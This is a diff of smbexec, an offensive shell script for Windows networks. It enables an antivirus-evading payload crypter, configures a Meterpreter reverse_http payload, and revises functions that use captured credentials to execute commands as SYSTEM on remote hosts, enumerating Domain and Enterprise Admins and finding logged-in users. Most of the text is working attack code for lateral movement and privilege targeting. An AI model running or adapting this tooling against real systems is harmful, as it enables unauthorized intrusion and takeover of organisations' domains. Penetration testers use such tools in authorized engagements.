@@ -24,7 +24,7 @@
 #
 #############################################################################################
 
-version="1.2.8"
+version="1.2.8.1"
 codename="Take On Me"
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
@@ -43,7 +43,7 @@ fi
 # http://www.nullsecurity.net/tools/binary.html
 # If you have a 64bit system ensure you have configured wine properly to run 32 bit on 64Bit arch
 # or you have set up multiarch otherwise this will fail
-#enable_crypter=1
+enable_crypter=1
 
 trap f_ragequit 2
 
@@ -94,14 +94,7 @@ f_banner
 
 echo -e "\e[1;34m[*]\e[0m Let's get your payload setup...\n"
 
-#"************************************************************"
-#"    Fully Undetectable Metasploit Payload generaor Beta     "
-#"        Original Concept and Script by Astr0baby            "
-#"     Stable Version of Script is Edited by Vanish3r         "
-#"    Video Tutorial by Vanish3r - www.securitylabs.in        "
-#" Powered by TheHackerNews.com and securitylabs.in           "
-#"************************************************************"
-# Major script modifications by Brav0Hax and al14s
+# Original idea from vanisher.sh -> Major script modifications by Brav0Hax, al14s & Hostess
 
 	f_revhttp(){
 		payload=windows/meterpreter/reverse_http
@@ -393,13 +386,18 @@ else
 fi
 }
 f_get_domain_admin_users(){
-if [ ! -s /tmp/smbexec/admins.tmp ]; then
-	${smbexecpath}/smbwinexe --system -U ${SMBDomain}/${j} //${i} "CMD /C net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain" &> /tmp/smbexec/admins.tmp
+if [ -f "/tmp/smbexec/admins.lst" ] && [ -s "/tmp/smbexec/admins.lst" ]; then
+	admins_list_created=1
+else
+	${smbexecpath}/smbwinexe --system -U ${SMBDomain}/${j} //${i} "CMD /C net group \"Domain Admins\" /domain" &> /tmp/smbexec/domainadmins.tmp
+	${smbexecpath}/smbwinexe --system -U ${SMBDomain}/${j} //${i} "CMD /C net group \"Enterprise Admins\" /domain" &> /tmp/smbexec/enterpriseadmins.tmp
+	cat /tmp/smbexec/domainadmins.tmp /tmp/smbexec/enterpriseadmins.tmp > /tmp/smbexec/admins.tmp
+	admins_list_check=$(cat /tmp/smbexec/admins.tmp |egrep '(error|winexe)')
+	if [ -z "${admins_list_check}" ]; then
+		cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS|not be found|domain controller|HELPMSG)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|tr '[:upper:]' '[:lower:]'|sort -u> /tmp/smbexec/admins.lst
+	fi
 fi
-admins_list_check=$(cat /tmp/smbexec/admins.tmp |egrep '(error|winexe)')
-if [ -z "${admins_list_check}" ]; then
-	cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|tr '[:upper:]' '[:lower:]'|sort -u> /tmp/smbexec/admins.lst
-fi
+
 }
 f_get_logged_in_users(){
 ${smbexecpath}/smbwinexe --uninstall --system -U ${SMBDomain}/${j} //${i} "CMD /C tasklist /V /FO CSV" &> /tmp/smbexec/tasklist.tmp
@@ -407,9 +405,9 @@ ${smbexecpath}/smbwinexe --uninstall --system -U ${SMBDomain}/${j} //${i} "CMD /
 f_tasklisk_check
 
 if [ -z "${tasklist_check}" ]; then
-	cat /tmp/smbexec/tasklist.tmp |cut -d '"' -f14|egrep -v '(NT AUTHORITY|User Name|HASH PASS|ERRDOS)'|cut -d "\\" -f2|tr '[:upper:]' '[:lower:]'|sort -u > /tmp/smbexec/tasklist.sorted
+	cat /tmp/smbexec/tasklist.tmp|grep -i ${SMBDomain}|cut -d '"' -f14|egrep -i -v '(local service|network service|system|user name)'|cut -d "\\" -f2|tr '[:upper:]' '[:lower:]'|sort -u > /tmp/smbexec/tasklist.sorted
 	${smbexecpath}/smbwinexe --uninstall --system -U ${SMBDomain}/${j} //${i} "CMD /C qwinsta" &> /tmp/smbexec/qwinsta.tmp
-	cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|cut -d "," -f3|egrep -v '(USERNAME|65536|HASH PASS|ERRDOS)'|tr '[:upper:]' '[:lower:]' > /tmp/smbexec/qwinsta.sorted
+	cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|egrep '(Active|Disc)'|grep -v "services\,0"|cut -d "," -f3|tr '[:upper:]' '[:lower:]' > /tmp/smbexec/qwinsta.sorted
 	sort -u /tmp/smbexec/tasklist.sorted /tmp/smbexec/qwinsta.sorted > /tmp/smbexec/loggedin.users
 else
 	echo -e "\e[1;31m[-]\e[0m Looks like tasklist isn't available for the system, it may be Win2K."
